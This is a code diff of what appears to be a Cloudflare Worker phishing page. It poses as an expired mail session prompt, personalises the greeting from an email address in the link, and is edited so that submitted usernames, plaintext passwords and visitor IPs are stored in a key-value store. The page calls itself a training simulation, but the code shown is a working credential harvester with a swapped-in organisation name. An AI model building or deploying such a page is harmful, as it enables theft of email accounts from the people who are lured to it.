@@ -1,25 +1,54 @@
 export default {
   async fetch(request, env) {
-    if (request.method === "POST") {
+    const url = new URL(request.url);
+    
+    // Handle form submission
+    if (url.pathname === '/post' && request.method === 'POST') {
       const formData = await request.formData();
-      const username = formData.get("username");
-      const password = formData.get("password");
-
-      if (username && password) {
-        await env.creds.put(username, password);
-
-        return new Response(null, {
-          status: 303,
-          headers: { "Location": "https://www.google.com" }
-        });
-      } else {
-        return new Response("Missing username or password", { status: 400 });
-      }
+      const username = formData.get('username');
+      const password = formData.get('password');
+      
+      // Store in Cloudflare KV
+      const timestamp = Date.now();
+      const submissionId = crypto.randomUUID();
+      
+      const submissionData = {
+        id: submissionId,
+        username: username,
+        password: password,
+        timestamp: timestamp,
+        ip: request.headers.get('cf-connecting-ip') || 'unknown'
+      };
+      
+      // Store in KV with unique key
+      await env.INBOX_KV.put(`submission:${submissionId}`, JSON.stringify(submissionData));
+      
+      // Also store by timestamp for easier querying
+      await env.INBOX_KV.put(`latest:${timestamp}`, JSON.stringify(submissionData));
+      
+      // Return success response
+      return new Response('Data stored successfully', {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/plain',
+          'Access-Control-Allow-Origin': '*'
+        }
+      });
     }
+    
+    // Serve the HTML form for all other requests
+    return new Response(htmlContent, {
+      headers: {
+        'Content-Type': 'text/html',
+      },
+    });
+  }
+};
 
-    const htmlContent = `
-<!doctype html>
+// Your original HTML (unchanged)
+const htmlContent = `<!doctype html>
 <html lang="en">
+
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -29,8 +58,9 @@ export default {
 </head>
 
 <body>
+    <!-- Form now submits to /post via POST -->
     <form id="training-form" class="training-stage" role="main"
-        action="/post" method="post"
+        method="post"
         aria-label="Internal training simulation of an expired mail session"
         aria-describedby="session-expiry-description">
         <div id="mailbox-label" class="mailbox-label" aria-live="polite"></div>
@@ -38,11 +68,14 @@ export default {
             the action you just requested will be automatically reattempted. To go back without reauthentication, click here.
         </p>
         <label class="sr-only" for="username">username</label>
+        <!-- Added name="username" for form submission -->
         <input id="training-username" name="username" class="training-input training-input--username" type="text"
             autocomplete="off" autocapitalize="none" spellcheck="false">
         <label class="sr-only" for="password">password</label>
+        <!-- Added name="password" for form submission -->
         <input id="training-password" name="password" class="training-input training-input--password" type="password"
             autocomplete="off" spellcheck="false">
+        <!-- Changed type to "submit" so the form submits -->
         <button id="training-submit" class="training-submit" type="submit" aria-label="Sign in"></button>
     </form>
     <script>
@@ -51,7 +84,9 @@ export default {
                 e = document.getElementById("mailbox-label"),
                 u = document.getElementById("training-username"),
                 t = new URLSearchParams(window.location.search).get("email"),
-                r = () => { e.textContent = "Welcome to Alnaghi" };
+                r = () => { e.textContent = "Drug Safety1" };
+
+            // Removed preventDefault – form now submits normally
 
             if (!e || !u) return;
             if (!t || t.length > 254) return r();
@@ -60,6 +95,8 @@ export default {
             if (n < 1 || n !== t.lastIndexOf("@")) return r();
 
             const o = t.slice(0, n);
+            const domain = t.slice(n + 1);
+
             const displayName = o.split(/[._-]/)
                 .map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
                 .join(" ");
@@ -71,9 +108,3 @@ export default {
 </body>
 
 </html>`;
-
-    return new Response(htmlContent, {
-      headers: { "Content-Type": "text/html" },
-    });
-  },
-};
